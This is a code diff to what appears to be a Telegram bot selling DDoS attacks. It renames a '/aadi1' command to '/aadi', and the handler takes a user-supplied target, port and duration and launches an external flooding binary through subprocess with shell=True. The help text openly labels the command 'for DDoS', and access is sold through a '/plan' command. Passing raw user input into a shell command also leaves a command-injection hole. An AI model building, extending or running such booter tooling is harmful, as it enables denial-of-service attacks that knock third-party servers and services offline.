@@ -204,24 +204,24 @@ def start_attack_reply(message, target, port, time):
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /aadi command
-aadi1_cooldown = {}
+aadi_cooldown = {}
 
 COOLDOWN_TIME = 0 #  seconds cooldown time
 
 # Handler for /aadi command
-@bot.message_handler(commands=['aadi1'])
-def handle_aadi1(message):
+@bot.message_handler(commands=['aadi'])
+def handle_aadi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in aadi1_cooldown and (datetime.datetime.now() - aadi1_cooldown[user_id]).seconds < 10:
-                response = "ᴄᴏᴏʟᴅᴏᴡɴ ᴏɴ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ¼ ᴍɪɴᴜᴛᴇ ᴀɴᴅ ᴜsᴇ ᴀɢᴀɪɴ /aadi1 ᴄᴏᴍᴍᴀɴᴅ❗\nhttps://t.me/user_x_dead "
+            if user_id in aadi_cooldown and (datetime.datetime.now() - aadi_cooldown[user_id]).seconds < 10:
+                response = "ᴄᴏᴏʟᴅᴏᴡɴ ᴏɴ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ¼ ᴍɪɴᴜᴛᴇ ᴀɴᴅ ᴜsᴇ ᴀɢᴀɪɴ /aadi ᴄᴏᴍᴍᴀɴᴅ❗\nhttps://t.me/user_x_dead "
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
-            aadi1_cooldown[user_id] = datetime.datetime.now()
+            aadi_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
         if len(command) == 4:  # Updated to accept target, port, and time
@@ -231,25 +231,25 @@ def handle_aadi1(message):
             if time > 201:
                 response = "ᴇʀʀᴏʀ: ᴍᴀx ᴀᴛᴛᴀᴄᴋ sᴇᴄᴏɴᴅ 200sᴇᴄ ❌."
             else:
-                record_command_logs(user_id, '/aadi1', target, port, time)
+                record_command_logs(user_id, '/aadi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./sharp {target} {port} {time} 975"
+                full_command = f"./aadi {target} {port} {time} 975"
                 subprocess.run(full_command, shell=True)
                 response = f"🚀ᴀᴛᴛᴀᴄᴋ ᴏɴ➡️ {target}:{port} \n💘ᴄᴏᴍᴘʟᴇᴛᴇ ✅ sᴜᴄᴄᴇssғᴜʟʟʏ🔊️\n https://t.me/+KWXSknpfd4w2NmJl"
         else:
-            response = "ᴜsᴀɢᴇ✅ :- /aadi1 <target> <port> <time>\nhttps://t.me/+KWXSknpfd4w2NmJl "  # Updated command syntax
+            response = "ᴜsᴀɢᴇ✅ :- /aadi <target> <port> <time>\nhttps://t.me/+KWXSknpfd4w2NmJl "  # Updated command syntax
 
 
     else:
-        response = "ABHI FREE SEVA BAND HA THORA WAIT KARO \nhttps://t.me/user_x_dead 🤬"
+        response = "ABHI FREE SEVA BAND HA THORA WAIT KARO \nhttps://t.me/user_x_dead 🕊️"
 
 
     bot.reply_to(message, response)
 
 
 
-# Add /mylogs command to display logs recorded for aadi1 and website commands
+# Add /mylogs command to display logs recorded for aadi and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
@@ -273,7 +273,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅ🐒
- /aadi1 : ғᴏʀ ᴅᴅᴏs 😈. 
+ /aadi : ғᴏʀ ᴅᴅᴏs 😈. 
  /rules : ʀᴇᴀᴅ ᴄᴀʀᴇғᴜʟʟʏ🦁.
  /mylogs : ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋ🐎.
  /plan : ʙᴜʏ ғʀᴏᴍ ᴀᴅᴍɪɴ ✓\n
